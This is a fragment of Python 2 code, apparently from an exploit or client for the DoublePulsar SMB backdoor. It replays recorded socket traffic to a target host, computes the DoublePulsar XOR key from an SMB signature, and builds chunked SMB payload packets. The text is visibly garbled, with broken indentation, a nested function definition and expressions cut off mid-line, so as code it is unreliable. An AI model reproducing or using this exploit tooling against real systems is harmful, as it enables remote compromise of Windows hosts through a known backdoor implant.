    	backlog = [ast.literal_eval(i) for i in backlog]
    	connections = []
    	start = time.time()
    	for i in backlog:
    	delta = i[-1] - (start - time.time())
    		print(i[0], delta)
    		if delta > 0:
    			time.sleep(delta)
    		start = time.time()
    		if i[0] == "connect":
    			sock = socket.socket()
    			sock.connect((HOST , PORT ))
    			connections.append({"socket":sock,"stream" : i[1]})
    		if i[0] == "close":
    			[j['socket'].close() for j in connections if j["stream"] == i[1]]
    		if i[0] == "send":
    			[j['socket'].send(i[2]) for j in connections if j["stream"] == i[1]]
    		if i[0] == "recv":
    			[j['socket'].recv(2048) for j in connections if j['stream'] == i[1]]
    def calculate_doublepulsar_xor_key(s):
    	"""Calaculate Doublepulsar Xor Key
    	"""
    	x = (2 * s ^ (((s & 0xff00 | (s > 16) | s & 0xff0000) >> 8)))
    	x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    	return x
    def make_unicode_host(org_host):
    	host_len = len(org_host)
    	new_host = ""
    	for i in range(host_len):
    		new_host =new_host + "x00" + org_host[i]
    	return new_host
    def get_smb_signature(smb_data):
    	print binascii.b2a_hex(smb_data[18:22])
    	return smb_data[18:22]
    	def get_key(smb_data):
    	smb_sign = struct.unpack(" 0:
    		ncount += 1
    	make_data =""
    	for i in range(ncount):
    		if i H",4096 +32 +34 + 12)
    			#print binascii.b2a_hex(smb_Length)